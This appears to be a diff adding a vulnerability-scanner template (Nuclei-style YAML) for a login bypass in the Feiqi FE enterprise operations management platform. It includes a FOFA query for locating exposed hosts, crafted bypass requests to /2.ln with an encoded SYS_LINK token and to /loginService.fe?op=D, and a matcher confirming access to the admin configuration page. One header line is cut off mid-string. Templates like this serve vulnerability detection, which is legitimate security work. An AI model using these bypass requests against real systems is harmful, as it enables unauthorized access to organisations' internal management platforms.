@@ -1,0 +1,31 @@
+id: fe-enterprise-bypass-login-config
+info:
+  name: 飞企互联-FE企业运营管理平台-登录绕过
+  author: rain
+  severity: critical
+  metadata:
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+
+requests:
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+      - |
+        GET /main/main.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geck
+    cookie-reuse: true
+    attack: batteringram
+    payloads:
+      path:
+        - /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056
+        - /loginService.fe?op=D
+ 
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200 && contains(body_2,'系统配置')
